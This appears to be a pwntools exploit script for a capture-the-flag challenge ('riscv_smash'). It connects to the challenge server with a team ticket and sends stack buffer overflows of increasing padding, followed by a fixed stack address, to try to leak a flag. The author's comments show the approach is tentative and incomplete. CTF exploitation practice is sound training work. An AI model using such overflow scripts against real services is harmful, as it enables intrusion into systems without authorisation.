from pwn import *

ticket = "ticket{tango317497india4:GCCxtXiWvPSC_3cvmwwMItYsYh8cRWnHPppWmT4ah174iECqXpwn7fLoAhxWodh_rA}".encode("utf-8")

srv = "riscv_smash.quals2023-kah5Aiv9.satellitesabove.me"
port = 5300


#0004b5c0 "Because I like you (and this is a baby's first type chall) here is something useful: %p\n"
#0x40800cfc

def sync(conn=None, p=True):
    msg = "ACEG" if p else "G"*400
    print(msg)
    conn.sendline(msg.encode("utf-8"))
        

conn = remote(srv,port)
l = conn.recvline()
rec = conn.sendline(ticket)
l = conn.recvlines(5)

#synch -> message_type -> overload 20char array with <= 60 chars
for n in range(3,40):
    sync(conn, True) #synchronize message

    msg_type = "BB".encode("utf-8") #Message for do_1b1 function
    print(msg_type)
    conn.sendline(msg_type)
    
    #Exploit goes here?  UNcertainty regarding what to overload with address of FLAG stack address
    # Probably a stack value used by another put function
    overflow = bytes.fromhex("41"*(20+n))  #Write 20+ A's followed by the stack pointer value
    address = bytes.fromhex("40800cfc")
    print(n, overflow+address)
    conn.sendline(overflow+address)
    
    #Might require additional code to purposefully force a failure to run a put function
    l = conn.recvline() #Should receive the flag
    print(l)
    print()
